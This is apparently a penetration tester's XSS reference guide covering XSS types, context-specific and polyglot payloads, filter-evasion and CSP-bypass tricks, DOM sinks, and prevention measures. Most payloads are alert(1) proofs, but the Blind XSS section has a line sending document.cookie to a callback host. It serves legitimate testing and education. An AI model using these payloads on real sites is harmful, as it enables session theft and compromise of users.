# Cross-Site Scripting (XSS) Reference Guide

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection where malicious scripts are injected into trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

## Types of XSS

### 1. Stored XSS (Persistent)
- Malicious script is stored on the target server
- Executed when users visit the affected page
- High impact as it affects multiple users

### 2. Reflected XSS (Non-Persistent)
- Malicious script is reflected off the web server
- Requires user to click a malicious link
- Often delivered via email or malicious websites

### 3. DOM-based XSS
- Vulnerability exists in client-side code
- Malicious payload never reaches the server
- Difficult to detect with traditional scanners

### 4. Blind XSS
- Payload executes on a different page/context
- Often in admin panels or logs
- Requires callback mechanism (XSS Hunter, etc.)

## Contexts and Payloads

### HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### Attribute Context
```html
" onmouseover="alert(1)
' onclick='alert(1)
" autofocus onfocus="alert(1)
javascript:alert(1)
```

### JavaScript Context
```javascript
';alert(1);'//
';alert(1);'
\x27;alert(1)//
'-alert(1)-'
'+alert(1)+'
```

### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Bypass Techniques

### Filter Evasion
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Encoding
```html
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
%3Cscript%3Ealert(1)%3C/script%3E
```

### Alternative Event Handlers
```html
onerror
onload
onmouseover
onclick
onfocus
onblur
onchange
onsubmit
onkeypress
onmouseenter
onmouseleave
ontoggle
```

### Template Injection
```
{{constructor.constructor('alert(1)')()}}
${alert(1)}
#{alert(1)}
```

## DOM XSS Sinks

### Document Sinks
```javascript
document.write()
document.writeln()
document.domain
document.cookie
document.location
document.URL
document.documentURI
document.baseURI
document.referrer
```

### Location Sinks
```javascript
location
location.href
location.search
location.hash
location.pathname
location.assign()
location.replace()
```

### Execution Sinks
```javascript
eval()
setTimeout()
setInterval()
Function()
execScript()
```

### HTML Sinks
```javascript
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
element.onevent
```

## CSP Bypass

### Unsafe Inline
```html
<script nonce="random">alert(1)</script>
```

### Unsafe Eval
```javascript
eval(atob("YWxlcnQoMSk="))
```

### JSONP Endpoints
```html
<script src="https://api.example.com/callback=alert(1)"></script>
```

### Angular CSP Bypass
```html
<iframe srcdoc="<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>">
```

## Detection Methods

### Manual Testing
1. Inject `<script>alert(1)</script>` in all input fields
2. Check if script executes or is encoded
3. Try different contexts (URL, form, headers)
4. Test with various encoding

### Automated Tools
- Burp Suite XSS Scanner
- XSStrike
- XSSer
- DalFox

## Prevention

### Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random';
```

### Output Encoding
```javascript
// HTML encode
function htmlEncode(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#x27;');
}
```

### Input Validation
- Whitelist approach
- Context-aware validation
- Regular expressions

### HttpOnly Cookies
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

## Polyglot Payloads

A polyglot payload works in multiple contexts:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Blind XSS Detection

### Payloads
```html
<script src=https://your.xss.ht></script>
<img src=x onerror="fetch('https://your.xss.ht/?c='+document.cookie)">
```

### Tools
- XSS Hunter
- Burp Collaborator
- Interactsh

## References

- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
- XSS Filter Evasion: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
- HTML5 Security Cheatsheet: https://html5sec.org/
